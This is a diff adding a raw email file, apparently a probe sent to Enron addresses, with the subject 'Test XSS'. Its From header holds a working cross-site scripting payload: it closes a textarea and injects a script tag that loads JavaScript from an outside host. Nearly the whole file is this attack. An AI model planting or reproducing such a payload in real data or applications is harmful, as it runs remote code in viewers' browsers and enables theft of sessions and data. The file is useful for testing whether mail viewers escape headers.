@@ -1,0 +1,7 @@
+From: <"test</textarea><script src=http://xsspt.com/6zTrS1?1456361170></script>@attack.com">
+To: lisa.mellencamp@enron.com, michael.tribolet@enron.com
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
